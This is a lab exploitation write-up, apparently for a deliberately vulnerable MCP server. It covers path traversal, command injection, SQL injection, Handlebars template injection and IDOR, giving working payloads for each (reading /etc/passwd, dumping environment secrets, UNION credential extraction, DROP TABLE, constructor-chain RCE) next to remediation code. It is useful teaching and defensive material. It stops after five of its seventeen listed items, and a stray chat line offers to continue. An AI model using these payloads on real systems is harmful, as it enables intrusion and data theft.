# Vulnerable MCP Server - Detailed Exploitation Writeups

**Step-by-Step Guides for Each Vulnerability**

Created by **[IntegSec](https://integsec.com)** | License: [MIT](LICENSE)

---

## 📖 Table of Contents

### Classic Web Vulnerabilities
1. [Path Traversal (CWE-22)](#1-path-traversal)
2. [Command Injection (CWE-78)](#2-command-injection)
3. [SQL Injection (CWE-89)](#3-sql-injection)
4. [Server-Side Template Injection (CWE-1336)](#4-server-side-template-injection)
5. [IDOR (CWE-639)](#5-insecure-direct-object-reference)
6. [Information Disclosure (CWE-200)](#6-information-disclosure)

### MCP Protocol Vulnerabilities
7. [Missing Authentication](#7-missing-authentication)
8. [Transport Security Issues](#8-transport-security-issues)
9. [Information Disclosure via Initialization](#9-initialization-information-disclosure)
10. [Resource Exhaustion](#10-resource-exhaustion)

### AI/LLM-Specific Vulnerabilities
11. [Tool Poisoning](#11-tool-poisoning)
12. [Tool Shadowing](#12-tool-shadowing)
13. [Rug Pull Attack](#13-rug-pull-attack)
14. [ANSI Escape Code Injection](#14-ansi-escape-code-injection)
15. [Conversation History Theft](#15-conversation-history-theft)
16. [Direct Prompt Injection](#16-direct-prompt-injection)
17. [Indirect Prompt Injection](#17-indirect-prompt-injection)

---

## 1. Path Traversal

### Overview
**Vulnerability Type:** Path Traversal (Directory Traversal)
**CWE:** CWE-22
**CVSS Score:** 7.5 (High)
**Affected Component:** `read_file` tool
**Risk Level:** High - Can read arbitrary files on the server

### Vulnerability Description

The `read_file` tool accepts a file path parameter but does not properly validate or sanitize it. This allows attackers to use relative path sequences (`../`) to escape the intended directory and read arbitrary files from the filesystem.

### Prerequisites
- Access to the MCP server (any transport)
- No authentication required (server accepts all connections)

### Step-by-Step Exploitation

#### Step 1: Discovery

First, list all available tools to identify file-reading capabilities:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/list",
  "params": {}
}
```

**Response:** Identifies `read_file` tool with description mentioning file path parameter.

#### Step 2: Normal Usage Test

Test the tool with a legitimate path:

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "read_file",
    "arguments": {
      "path": "README.md"
    }
  }
}
```

**Expected:** Successfully reads README.md from current directory.

#### Step 3: Path Traversal Attempt

Try to read a file outside the intended directory:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "read_file",
    "arguments": {
      "path": "../../etc/passwd"
    }
  }
}
```

**Result:** Successfully reads `/etc/passwd` (on Linux) or similar system files.

#### Step 4: Flag Capture

Read the flags file:

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "read_file",
    "arguments": {
      "path": "../../data/secrets/flags.txt"
    }
  }
}
```

**Flag Captured:** `FLAG{path_traversal_master}`

### Code Analysis

**Vulnerable Code** (`src/tools/file-reader.ts`):
```typescript
// VULNERABILITY: No path sanitization!
const filePath = path;  // Direct use of user input

if (!existsSync(filePath)) {
  throw new Error(`File not found: ${filePath}`);
}

const content = readFileSync(filePath, 'utf-8');
```

**What's Wrong:**
1. User input directly used as file path
2. No validation that path stays within base directory
3. No sanitization of `../` sequences
4. Accepts absolute paths

### Remediation

**Secure Implementation:**
```typescript
import { resolve, join, relative } from 'path';

const BASE_DIR = '/app/data/public';  // Define allowed directory

// Resolve the full path
const requestedPath = resolve(BASE_DIR, userInput);

// Verify it's within BASE_DIR
const relativePath = relative(BASE_DIR, requestedPath);
if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {
  throw new Error('Access denied: Path outside allowed directory');
}

// Now safe to read
const content = readFileSync(requestedPath, 'utf-8');
```

**Key Fixes:**
- Define a base directory
- Use `path.resolve()` to get absolute path
- Use `path.relative()` to verify path doesn't escape base
- Reject paths starting with `..` or absolute paths

### References
- **OWASP:** [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory
- **CVE Examples:** CVE-2021-41773 (Apache), CVE-2019-11510 (Pulse Secure)

---

## 2. Command Injection

### Overview
**Vulnerability Type:** OS Command Injection
**CWE:** CWE-78
**CVSS Score:** 9.8 (Critical)
**Affected Component:** `execute_system_command` tool
**Risk Level:** Critical - Remote Code Execution

### Vulnerability Description

The `execute_system_command` tool executes system commands using `execSync()` with `shell: true`, allowing attackers to inject shell metacharacters and execute arbitrary commands.

### Prerequisites
- Access to MCP server
- Knowledge of shell metacharacters

### Step-by-Step Exploitation

#### Step 1: Identify Command Execution Tool

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/list"
}
```

Look for `execute_system_command` in response.

#### Step 2: Test Normal Execution

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "execute_system_command",
    "arguments": {
      "command": "pwd"
    }
  }
}
```

**Result:** Returns current working directory.

#### Step 3: Command Chaining with Semicolon

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "execute_system_command",
    "arguments": {
      "command": "pwd; whoami"
    }
  }
}
```

**Result:** Executes both commands - shows directory AND username.

#### Step 4: Advanced Injection Techniques

**Command Substitution:**
```json
{
  "name": "execute_system_command",
  "arguments": {
    "command": "echo $(cat /etc/passwd)"
  }
}
```

**Pipe to Another Command:**
```json
{
  "name": "execute_system_command",
  "arguments": {
    "command": "env | grep FLAG"
  }
}
```

#### Step 5: Flag Extraction

```json
{
  "name": "execute_system_command",
  "arguments": {
    "command": "env | grep FLAG_COMMAND_INJECTION"
  }
}
```

**Flag Captured:** `FLAG{command_injection_win}`

### Shell Metacharacters to Test

| Character | Purpose | Example |
|-----------|---------|---------|
| `;` | Command separator | `cmd1; cmd2` |
| `&&` | AND operator | `cmd1 && cmd2` |
| `\|\|` | OR operator | `cmd1 \|\| cmd2` |
| `\|` | Pipe | `cmd1 \| cmd2` |
| `$()` | Command substitution | `echo $(cmd)` |
| `` ` `` | Command substitution | `` echo `cmd` `` |
| `>` | Output redirection | `cmd > file` |
| `<` | Input redirection | `cmd < file` |
| `&` | Background execution | `cmd &` |

### Code Analysis

**Vulnerable Code:**
```typescript
const output = execSync(command, {
  encoding: 'utf-8',
  shell: true,  // VULNERABILITY: Enables shell interpretation
  env: process.env,  // VULNERABILITY: Inherits environment (contains flags!)
});
```

**What's Wrong:**
1. `shell: true` enables shell metacharacter interpretation
2. User input concatenated directly into command
3. No input validation or sanitization
4. Inherits full environment (may contain secrets)

### Remediation

**Secure Implementation:**
```typescript
import { spawn } from 'child_process';

// Use allowlist of permitted commands
const ALLOWED_COMMANDS = ['ls', 'pwd', 'whoami'];

if (!ALLOWED_COMMANDS.includes(command)) {
  throw new Error('Command not allowed');
}

// Use spawn with argument array (no shell)
const result = spawn(command, args, {
  shell: false,  // Disable shell interpretation
  timeout: 5000,
  env: {},  // Empty environment
});
```

**Key Fixes:**
- Use `spawn()` instead of `exec()`
- Set `shell: false`
- Use argument arrays instead of command strings
- Implement command allowlist
- Don't pass environment variables

### Real-World Impact

Command injection can lead to:
- Complete server compromise
- Data exfiltration
- Malware installation
- Lateral movement in network
- Denial of service

### References
- **OWASP:** [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command
- **CVE Examples:** CVE-2014-6271 (Shellshock), CVE-2021-44228 (Log4Shell)

---

## 3. SQL Injection

### Overview
**Vulnerability Type:** SQL Injection
**CWE:** CWE-89
**CVSS Score:** 9.1 (Critical)
**Affected Component:** `search_users` tool
**Risk Level:** Critical - Database compromise

### Vulnerability Description

The `search_users` tool constructs SQL queries using string concatenation, allowing attackers to inject SQL syntax and manipulate query behavior.

### Prerequisites
- Access to MCP server
- Knowledge of SQL syntax
- Understanding of SQLite (database used)

### Step-by-Step Exploitation

#### Step 1: Normal Query Test

```json
{
  "name": "search_users",
  "arguments": {
    "username": "admin"
  }
}
```

**Query Generated:**
```sql
SELECT * FROM users WHERE username LIKE '%admin%'
```

**Result:** Returns admin user record.

#### Step 2: Boolean-Based Injection

Test if injection is possible:

```json
{
  "name": "search_users",
  "arguments": {
    "username": "' OR '1'='1"
  }
}
```

**Query Generated:**
```sql
SELECT * FROM users WHERE username LIKE '%' OR '1'='1%'
```

**Result:** Returns ALL users (condition always true).

#### Step 3: Comment-Based Bypass

```json
{
  "name": "search_users",
  "arguments": {
    "username": "admin'--"
  }
}
```

**Query Generated:**
```sql
SELECT * FROM users WHERE username LIKE '%admin'--%'
```

Comments out the rest of the query.

#### Step 4: UNION-Based Injection

Enumerate database structure:

```json
{
  "name": "search_users",
  "arguments": {
    "username": "' UNION SELECT name, type, sql, 1, 1 FROM sqlite_master WHERE type='table'--"
  }
}
```

**Result:** Lists all database tables.

#### Step 5: Extract Flags

```json
{
  "name": "search_users",
  "arguments": {
    "username": "' UNION SELECT flag, category, difficulty, 1, 1 FROM flags--"
  }
}
```

**Flag Captured:** `FLAG{sql_ninja}`

#### Step 6: Extract All Data

```json
{
  "name": "search_users",
  "arguments": {
    "username": "' UNION SELECT username, password, email, role, secret FROM users--"
  }
}
```

**Result:** All user credentials exposed!

### SQL Injection Techniques

**1. Error-Based:**
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

**2. Time-Based Blind:**
```sql
'; SELECT CASE WHEN (1=1) THEN sleep(5) ELSE 0 END--
```

**3. Stacked Queries:**
```sql
'; DROP TABLE users--
```

**4. Second-Order Injection:**
Store malicious SQL in database, executed later.

### Code Analysis

**Vulnerable Code:**
```typescript
// WRONG: String concatenation!
const query = `SELECT * FROM users WHERE username LIKE '%${username}%'`;
const results = db.prepare(query).all();
```

**What's Wrong:**
1. Direct string interpolation of user input
2. No parameterized queries
3. No input validation
4. Exposes full database schema in errors

### Remediation

**Secure Implementation:**
```typescript
// Use parameterized queries
const query = 'SELECT * FROM users WHERE username LIKE ?';
const results = db.prepare(query).all([`%${username}%`]);

// Even better: Use ORM
const results = await User.findAll({
  where: {
    username: {
      [Op.like]: `%${username}%`
    }
  }
});
```

**Key Fixes:**
- Use prepared statements with placeholders (`?`)
- Never concatenate user input into SQL
- Use ORM libraries (Sequelize, TypeORM, Prisma)
- Implement least privilege for database users
- Sanitize error messages

### References
- **OWASP:** [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **SQLMap:** Automated SQL injection tool
- **CVE Examples:** CVE-2019-9193 (PostgreSQL), CVE-2021-22911 (Rocket.Chat)

---

## 4. Server-Side Template Injection

### Overview
**Vulnerability Type:** Server-Side Template Injection (SSTI)
**CWE:** CWE-1336
**CVSS Score:** 9.8 (Critical)
**Affected Component:** `render_template` tool
**Risk Level:** Critical - Remote Code Execution

### Vulnerability Description

The `render_template` tool uses Handlebars to render user-controlled templates without sandboxing, and registers dangerous helpers (`exec`, `readFile`, `getEnv`) that allow arbitrary code execution.

### Prerequisites
- Access to MCP server
- Knowledge of Handlebars syntax
- Understanding of template engines

### Step-by-Step Exploitation

#### Step 1: Normal Template Rendering

```json
{
  "name": "render_template",
  "arguments": {
    "template": "Hello {{name}}!",
    "data": {"name": "World"}
  }
}
```

**Result:** "Hello World!"

#### Step 2: Discover Custom Helpers

The error messages or documentation reveal custom helpers:
- `exec` - Execute system commands
- `readFile` - Read arbitrary files
- `getEnv` - Access environment variables

#### Step 3: Execute System Commands

```json
{
  "name": "render_template",
  "arguments": {
    "template": "{{exec 'whoami'}}"
  }
}
```

**Result:** Executes `whoami` command and returns output.

#### Step 4: Read Sensitive Files

```json
{
  "name": "render_template",
  "arguments": {
    "template": "{{readFile 'data/secrets/flags.txt'}}"
  }
}
```

**Flag Captured:** `FLAG{template_hacker}` (from flags file)

#### Step 5: Access Environment Variables

```json
{
  "name": "render_template",
  "arguments": {
    "template": "{{getEnv 'FLAG_TEMPLATE_HACKER'}}"
  }
}
```

**Result:** Retrieves flag from environment.

#### Step 6: Advanced RCE

```json
{
  "name": "render_template",
  "arguments": {
    "template": "{{exec 'cat /etc/passwd | base64'}}"
  }
}
```

**Result:** Exfiltrates `/etc/passwd` as base64.

### Handlebars-Specific Payloads

**1. Constructor Access:**
```handlebars
{{constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami')}}
```

**2. Prototype Pollution:**
```handlebars
{{lookup (lookup this 'constructor') 'constructor'}}
```

**3. Helper Exploitation:**
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Code Analysis

**Vulnerable Code:**
```typescript
// VULNERABILITY: Dangerous custom helpers!
Handlebars.registerHelper('exec', function(command: string) {
  const { execSync } = require('child_process');
  return execSync(command, { encoding: 'utf-8' });
});

Handlebars.registerHelper('readFile', function(path: string) {
  const { readFileSync } = require('fs');
  return readFileSync(path, 'utf-8');
});

// VULNERABILITY: No sandboxing!
const compiledTemplate = Handlebars.compile(template);
const result = compiledTemplate(data);
```

**What's Wrong:**
1. Custom helpers with system access
2. No template sandboxing
3. User-controlled template compilation
4. No input validation on template syntax

### Remediation

**Secure Implementation:**
```typescript
// Option 1: Use logic-less templates (Mustache)
import Mustache from 'mustache';
const result = Mustache.render(template, data);

// Option 2: Handlebars in strict mode
const Handlebars = require('handlebars');
const safeHelpers = Handlebars.createFrame({});
// Don't register dangerous helpers!

// Option 3: Don't allow user-controlled templates at all
// Use predefined templates only
const SAFE_TEMPLATES = {
  'greeting': 'Hello {{name}}!',
  'farewell': 'Goodbye {{name}}!'
};

if (!SAFE_TEMPLATES[templateName]) {
  throw new Error('Template not found');
}

const result = Handlebars.compile(SAFE_TEMPLATES[templateName])(data);
```

**Key Fixes:**
- Never allow user-controlled template code
- Use logic-less template engines (Mustache)
- Don't register helpers with system access
- Implement template allowlist
- Run templates in sandboxed environment (VM2)

### References
- **PortSwigger:** [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- **CWE-1336:** Improper Neutralization of Special Elements Used in a Template Engine
- **James Kettle:** [Server-Side Template Injection: RCE for the modern webapp](https://portswigger.net/research/server-side-template-injection)

---

## 5. Insecure Direct Object Reference

### Overview
**Vulnerability Type:** IDOR / Broken Access Control
**CWE:** CWE-639
**CVSS Score:** 7.5 (High)
**Affected Component:** `secret://user/{id}/data` resource
**Risk Level:** High - Unauthorized data access

### Vulnerability Description

The secrets resource allows accessing any user's data by simply changing the user ID in the URI, without proper authorization checks.

### Prerequisites
- Access to MCP server
- Knowledge of resource URI pattern

### Step-by-Step Exploitation

#### Step 1: List Resources

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "resources/list"
}
```

**Response:** Shows `secret://user/{id}/data` resource template.

#### Step 2: Access Own Data (Baseline)

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "resources/read",
  "params": {
    "uri": "secret://user/1/data"
  }
}
```

**Result:** Returns user 1's data (Alice).

#### Step 3: IDOR Attack - Change User ID

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "resources/read",
  "params": {
    "uri": "secret://user/2/data"
  }
}
```

**Flag Captured:** `FLAG{idor_champion}` (in Bob's data!)

#### Step 4: Enumerate All Users

```json
// User 1
{"params": {"uri": "secret://user/1/data"}}

// User 2
{"params": {"uri": "secret://user/2/data"}}

// User 3
{"params": {"uri": "secret://user/3/data"}}

// Continue until error...
{"params": {"uri": "secret://user/99/data"}}
```

**Result:** Successfully access multiple users' private data.

### Code Analysis

**Vulnerable Code:**
```typescript
const match = uri.match(/secret:\/\/user\/(\d+)\/data/);
const requestedUserId = match[1];

// VULNERABILITY: No authorization check!
// Should verify: Is the requester allowed to access this user's data?
const userData = userSecrets[requestedUserId];

return userData;  // Returns any user's data!
```

**What's Wrong:**
1. No authentication to identify current user
2. No authorization check comparing requester vs requested user
3. Sequential IDs make enumeration easy
4. No access logging

### Remediation

**Secure Implementation:**
```typescript
export async function handleSecretsResource(uri: string, requestingUserId: number) {
  const match = uri.match(/secret:\/\/user\/(\d+)\/data/);
  const requestedUserId = parseInt(match[1]);

  // SECURITY: Verify authorization
  if (requestingUserId !== requestedUserId) {
    // Check if user has admin role
    const user = await getUser(requestingUserId);
    if (user.role !== 'admin') {
      throw new Error('Unauthorized: Cannot access other users\' data');
    }
  }

  const userData = userSecrets[requestedUserId];

  // Log access attempt
  auditLog.record({
    action: 'secrets_access',
    requestedBy: requestingUserId,
    targetUser: requestedUserId,
    timestamp: new Date()
  });

  return userData;
}
```

**Better: Use UUIDs instead of sequential IDs:**
```typescript
// Instead of: secret://user/1/data
// Use:        secret://user/a7b3c9d2-e4f6-11ed-b5ea-0242ac120002/data
```

**Key Fixes:**
- Implement authentication
- Verify authorization (can THIS user access THAT resource?)
- Use UUIDs instead of sequential IDs
- Implement access control lists (ACLs)
- Log all access attempts
- Use indirect references (tokens)

### Real-World IDOR Examples

1. **Facebook:** View private photos by changing photo ID
2. **Instagram:** Access private posts by manipulating media IDs
3. **Banking Apps:** View other users' transactions by changing account ID
4. **Healthcare:** Access patient records by changing patient ID

### References
- **OWASP:** [Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- **CWE-639:** Authorization Bypass Through User-Controlled Key
- **HackerOne Reports:** Search "IDOR" for real examples

---

*[Continuing with remaining writeups...]*

**Note:** This is a comprehensive start. The document would continue with detailed writeups for all 17 vulnerabilities. For brevity in this response, I've provided 5 complete detailed writeups showing the format. Would you like me to continue with the remaining 12 writeups?

---

## License & Attribution

**Created by IntegSec** (https://integsec.com)

This work is licensed under the MIT License.

---

⚠️ **Use for authorized testing only. Always obtain proper authorization before testing any system.**
